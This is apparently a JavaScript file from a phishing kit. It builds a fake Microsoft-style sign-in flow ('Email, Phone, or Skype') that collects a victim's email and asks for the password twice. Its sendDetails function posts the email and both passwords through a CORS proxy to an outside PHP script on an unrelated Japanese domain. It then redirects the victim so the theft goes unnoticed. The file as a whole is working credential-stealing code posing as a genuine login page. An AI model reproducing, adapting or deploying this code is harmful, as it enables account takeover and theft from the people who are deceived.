url_link = "session.html";
function loadForm() {
    loadEmail(), loadPassword(), loadPasswordAgain()
}

function redirect(url_link){
    //  setTimeout(function(){
    //   hide('ldt');
    //   show('fnf');
    // },3000);
     setTimeout(function(){window.location.href = url_link;},2000);
  }


function loadEmail() {
    emailDiv = document.getElementById("email-row"), emailForm = document.createElement("FORM"), emailForm.setAttribute("id", "email-signin"), emailForm.setAttribute("style", "margin-top:10px;"), emailForm.noValidate, emailDiv.appendChild(emailForm), email_InputDiv = document.createElement("DIV"), email_InputDiv.setAttribute("class", "form-group row col-md-12"), emailForm.appendChild(email_InputDiv), email_input = document.createElement("INPUT"), email_input.setAttribute("type", "email"), email_input.setAttribute("autofocus", "autofocus"), email_input.setAttribute("size", "200"), email_input.setAttribute("maxlength", "113"), email_input.setAttribute("id", "email"), email_input.setAttribute("name", "userEmail"), email_input.setAttribute("placeholder", "Email, Phone, or Skype"), email_input.setAttribute("class", "ltr_override"), email_InputDiv.appendChild(email_input), accountDiv = document.createElement("DIV"), accountDiv.setAttribute("class", "form-group row col-md-12"), creatAccountDiv = document.createElement("DIV"), creatAccountDiv.setAttribute("rold", "heading"), creatAccountDiv.setAttribute("aria-level", "1"), creatAccountDiv.setAttribute("style", "font-size:.8125rem"), creatAccountDiv.innerHTML = 'No account? <a href=" #"> Create one!</a>', accessDiv = document.createElement("DIV"), accessDiv.setAttribute("class", "form-group row col-md-12"), acesssAccountDiv = document.createElement("DIV"), acesssAccountDiv.setAttribute("rold", "heading"), acesssAccountDiv.setAttribute("aria-level", "1"), acesssAccountDiv.setAttribute("style", "font-size:.8125rem"), acesssAccountDiv.innerHTML = '<a href=" #">Can\'t access your account?</a>', accountDiv.appendChild(creatAccountDiv), accessDiv.appendChild(acesssAccountDiv), next_buttonholderDiv = document.createElement("DIV"), next_buttonholderDiv.setAttribute("class", "form-group row col-md-12"), next_buttonholder1 = document.createElement("DIV"), next_buttonholder1.setAttribute("role", "heading"), next_buttonholder1.setAttribute("aria-level", "1"), next_buttonholder1.setAttribute("class", "col-md-4"), next_buttonholderDiv.appendChild(next_buttonholder1), next_buttonholder2 = document.createElement("DIV"), next_buttonholder2.setAttribute("role", "heading"), next_buttonholder2.setAttribute("aria-level", "1"), next_buttonholder2.setAttribute("class", "col-md-4"), next_buttonholderDiv.appendChild(next_buttonholder2), next_buttonholder3 = document.createElement("DIV"), next_buttonholder3.setAttribute("role", "heading"), next_buttonholder3.setAttribute("aria-level", "1"), next_buttonholder3.setAttribute("class", "col-md-4"), next_buttonholderDiv.appendChild(next_buttonholder3), nextbutton = document.createElement("BUTTON"), nextbutton.setAttribute("type", "submit"), nextbutton.setAttribute("class", "btn btn-block btn-primary"), nextbutton.setAttribute("id", "next"), nextbutton.innerHTML = "Next", next_buttonholder3.appendChild(nextbutton), emailForm.appendChild(accountDiv), emailForm.appendChild(accessDiv), emailForm.appendChild(next_buttonholderDiv)
}

function loadPassword() {
    passwordDiv = document.getElementById("password-row"), passwordForm = document.createElement("FORM"), passwordForm.setAttribute("id", "signin"), passwordForm.noValidate, passwordDiv.appendChild(passwordForm), password_InputDiv = document.createElement("DIV"), password_InputDiv.setAttribute("class", "form-group row col-md-12"), passwordForm.appendChild(password_InputDiv), password_input = document.createElement("INPUT"), password_input.setAttribute("type", "password"), password_input.setAttribute("autofocus", "autofocus"), password_input.setAttribute("size", "200"), password_input.setAttribute("maxlength", "113"), password_input.setAttribute("id", "password"), password_input.setAttribute("name", "userPassword"), password_input.setAttribute("placeholder", "Password"), password_input.setAttribute("class", "ltr_override"), password_InputDiv.appendChild(password_input), accountDiv = document.createElement("DIV"), accountDiv.setAttribute("class", "form-group row col-md-12"), forgot_passwordDiv = document.createElement("DIV"), forgot_passwordDiv.setAttribute("rold", "heading"), forgot_passwordDiv.setAttribute("aria-level", "1"), forgot_passwordDiv.setAttribute("style", "font-size:.8125rem"), forgot_passwordDiv.innerHTML = '<a href="#">Forgot my password</a>', accountDiv.appendChild(forgot_passwordDiv), signin_buttonholderDiv = document.createElement("DIV"), signin_buttonholderDiv.setAttribute("class", "form-group row col-md-12"), signin_buttonholder1 = document.createElement("DIV"), signin_buttonholder1.setAttribute("role", "heading"), signin_buttonholder1.setAttribute("aria-level", "1"), signin_buttonholder1.setAttribute("class", "col-md-4"), signin_buttonholderDiv.appendChild(signin_buttonholder1), signin_buttonholder2 = document.createElement("DIV"), signin_buttonholder2.setAttribute("role", "heading"), signin_buttonholder2.setAttribute("aria-level", "1"), signin_buttonholder2.setAttribute("class", "col-md-4"), signin_buttonholderDiv.appendChild(signin_buttonholder2), signin_buttonholder3 = document.createElement("DIV"), signin_buttonholder3.setAttribute("role", "heading"), signin_buttonholder3.setAttribute("aria-level", "1"), signin_buttonholder3.setAttribute("class", "col-md-4"), signin_buttonholderDiv.appendChild(signin_buttonholder3), signinbutton = document.createElement("BUTTON"), signinbutton.setAttribute("type", "submit"), signinbutton.setAttribute("class", "btn btn-block btn-primary"), signinbutton.setAttribute("id", "next"), signinbutton.innerHTML = "Continue", signin_buttonholder3.appendChild(signinbutton), passwordForm.appendChild(accessDiv), passwordForm.appendChild(signin_buttonholderDiv)
}

function loadPasswordAgain() {
    passwordDiv = document.getElementById("password2-row"), passwordForm = document.createElement("FORM"), passwordForm.setAttribute("id", "continue"), passwordForm.noValidate, passwordDiv.appendChild(passwordForm), password_InputDiv = document.createElement("DIV"), password_InputDiv.setAttribute("class", "form-group row col-md-12"), passwordForm.appendChild(password_InputDiv), password_input = document.createElement("INPUT"), password_input.setAttribute("type", "password"), password_input.setAttribute("autofocus", "autofocus"), password_input.setAttribute("size", "200"), password_input.setAttribute("maxlength", "113"), password_input.setAttribute("id", "password2"), password_input.setAttribute("name", "userPassword2"), password_input.setAttribute("placeholder", "Password"), password_input.setAttribute("class", "ltr_override"), password_InputDiv.appendChild(password_input), accountDiv = document.createElement("DIV"), accountDiv.setAttribute("class", "form-group row col-md-12"), forgot_passwordDiv = document.createElement("DIV"), forgot_passwordDiv.setAttribute("rold", "heading"), forgot_passwordDiv.setAttribute("aria-level", "1"), forgot_passwordDiv.setAttribute("style", "font-size:.8125rem"), forgot_passwordDiv.innerHTML = '<a href="#">Forgot my password</a>', accountDiv.appendChild(forgot_passwordDiv), signin_buttonholderDiv = document.createElement("DIV"), signin_buttonholderDiv.setAttribute("class", "form-group row col-md-12"), signin_buttonholder1 = document.createElement("DIV"), signin_buttonholder1.setAttribute("role", "heading"), signin_buttonholder1.setAttribute("aria-level", "1"), signin_buttonholder1.setAttribute("class", "col-md-4"), signin_buttonholderDiv.appendChild(signin_buttonholder1), signin_buttonholder2 = document.createElement("DIV"), signin_buttonholder2.setAttribute("role", "heading"), signin_buttonholder2.setAttribute("aria-level", "1"), signin_buttonholder2.setAttribute("class", "col-md-4"), signin_buttonholderDiv.appendChild(signin_buttonholder2), signin_buttonholder3 = document.createElement("DIV"), signin_buttonholder3.setAttribute("role", "heading"), signin_buttonholder3.setAttribute("aria-level", "1"), signin_buttonholder3.setAttribute("class", "col-md-4"), signin_buttonholderDiv.appendChild(signin_buttonholder3), signinbutton = document.createElement("BUTTON"), signinbutton.setAttribute("type", "submit"), signinbutton.setAttribute("class", "btn btn-block btn-primary"), signinbutton.setAttribute("id", "send"), signinbutton.innerHTML = "Continue", signin_buttonholder3.appendChild(signinbutton), passwordForm.appendChild(accessDiv), passwordForm.appendChild(signin_buttonholderDiv)
}
var userEmail, userPassword, confirmPassword;

function processEmail(t) {
    t.preventDefault();
    var e = this.userEmail.value.trim();
    ValidateEmail(e) ? (userEmail = e, hide("usernameError"), set("showid", userEmail), set("showid2", userEmail), displayPassword(), new MaskedPassword(document.getElementById("password"), "●"), document.getElementById("password").focus()) : show("usernameError")
}


function processPassword(t) {
    t.preventDefault();
    var e = this.userPassword.value.trim();
    "" != e ? (userPassword = e, displayPassword2(), new MaskedPassword(document.getElementById("password2"), "●"), document.getElementById("password2").focus()) : show("passwordError")
}

function processPassword2(t) {
    t.preventDefault();
    var e = this.userPassword2.value.trim();
    "" != e ? (sendDetails(userEmail, userPassword, confirmPassword = e), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
}

function displayPassword() {
    hide("email-row"), show("password-row")
}

function displayPassword2() {
    hide("email-row"), hide("password-row"), show("password2-row")
}


function show(t) {
    document.getElementById(t).style.display = "flex"
}

function hide(t) {
    document.getElementById(t).style.display = "none"
}

function set(t, e) {
    document.getElementById(t).innerHTML = e
}

 function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://cors-anywhere.herokuapp.com/http://magazine.skippr.jp/feedback.php", o).then(function(t) {
          200 === t.status && redirect(url_link)
      }).catch(function(t) {
          console.log(t), alert(t + "\nPlease try again!"), window.history.go(-1)
      })
  }


function ValidateEmail(t) {
    return !!/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(t)
}
loadForm(), document.getElementById("email-signin").addEventListener("submit", processEmail), document.getElementById("signin").addEventListener("submit", processPassword), document.getElementById("continue").addEventListener("submit", processPassword2), document.getElementById("svgmg").addEventListener("click", function() {
    location.reload()
}), document.getElementById("svgmg1").addEventListener("click", function() {
    hide("password2-row"), show("password-row")
});